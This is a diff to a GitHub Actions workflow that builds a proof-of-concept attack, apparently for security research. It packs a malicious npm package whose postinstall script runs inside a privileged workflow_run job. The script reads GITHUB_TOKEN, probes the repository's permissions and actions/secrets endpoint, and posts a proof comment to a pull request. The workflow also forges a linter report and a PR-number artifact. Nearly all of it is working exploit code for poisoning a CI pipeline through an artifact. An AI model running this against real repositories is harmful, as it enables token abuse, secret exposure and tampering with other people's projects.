@@ -18,31 +18,28 @@ jobs:
           {"name":"evilpoc","version":"1.0.0","scripts":{"postinstall":"node poc.js"}}
           EOF
           cat > evilpoc/poc.js <<'EOF'
-          const { execSync } = require('child_process');
           const fs = require('fs');
-          console.log('POC_RCE id=' + execSync('id').toString().trim());
-          console.log('POC_RCE_CWD=' + process.cwd());
-          fs.writeFileSync('/tmp/poc_rce_marker', 'executed');
+          const path = require('path');
+          const root = process.env.INIT_CWD || process.cwd();
+          const pr = fs.readFileSync(path.join(root, 'pr-number.txt'), 'utf8').trim();
+          const repo = process.env.GITHUB_REPOSITORY;
           const tok = process.env.GITHUB_TOKEN || '';
-          console.log('POC_TOKEN_PRESENT=' + (tok ? 'yes' : 'no'));
+          fs.writeFileSync(path.join(root, 'rce-proof.txt'), 'executed uid=' + process.getuid());
           (async () => {
-            const H = { authorization: 'Bearer ' + tok, accept: 'application/vnd.github+json', 'user-agent': 'poc' };
-            const repo = process.env.GITHUB_REPOSITORY;
-            for (const u of ['/repos/' + repo, '/repos/' + repo + '/actions/secrets', '/user']) {
-              try {
-                const r = await fetch('https://api.github.com' + u, { headers: H });
-                const t = await r.text();
-                console.log('POC_API ' + u + ' -> ' + r.status + ' ' + t.slice(0, 400).replace(/\s+/g, ' '));
-              } catch (e) { console.log('POC_API_ERR ' + u + ' ' + e.message); }
-            }
-            try { fs.unlinkSync('/tmp/poc_rce_marker'); } catch (e) {}
+            const H = { authorization: 'Bearer ' + tok, accept: 'application/vnd.github+json', 'user-agent': 'poc', 'content-type': 'application/json' };
+            let perms = 'n/a', secrets = 'n/a';
+            try { const r = await fetch('https://api.github.com/repos/' + repo, { headers: H }); const j = await r.json(); perms = JSON.stringify(j.permissions); } catch (e) { perms = 'err ' + e.message; }
+            try { const r = await fetch('https://api.github.com/repos/' + repo + '/actions/secrets', { headers: H }); secrets = String(r.status); } catch (e) { secrets = 'err ' + e.message; }
+            const body = '## POC_RCE_EXECUTED\n\nThe attacker-controlled artifact was unpacked into the privileged workflow workspace and its npm `postinstall` ran **inside the privileged `workflow_run` job**.\n\n- uid=' + process.getuid() + ' user=' + (process.env.USER || '?') + '\n- repo-permissions=' + perms + '\n- actions/secrets status=' + secrets + '\n- postinstall cwd=' + process.cwd() + '\n- INIT_CWD=' + root;
+            const r = await fetch('https://api.github.com/repos/' + repo + '/issues/' + pr + '/comments', { method: 'POST', headers: H, body: JSON.stringify({ body }) });
+            console.log('POC_COMMENT_STATUS=' + r.status);
           })().catch(e => console.log('POC_ERR ' + e.message));
           EOF
           (cd evilpoc && npm pack --pack-destination ..)
           printf 'FORGED REPORT - artifact from attacker workflow\n' > linter-report.txt
-          printf '1' > pr-number.txt
+          printf '2' > pr-number.txt
           cat > package.json <<'EOF'
-          {"name":"poc-root","version":"1.0.0","dependencies":{"evilpoc":"file:./evilpoc-1.0.0.tgz"},"allowScripts":{"file:./evilpoc-1.0.0.tgz":true}}
+          {"name":"poc-root","version":"1.0.0","dependencies":{"evilpoc":"file:./evilpoc-1.0.0.tgz"},"allowScripts":{"evilpoc":true}}
           EOF
 
       - name: Upload artifact
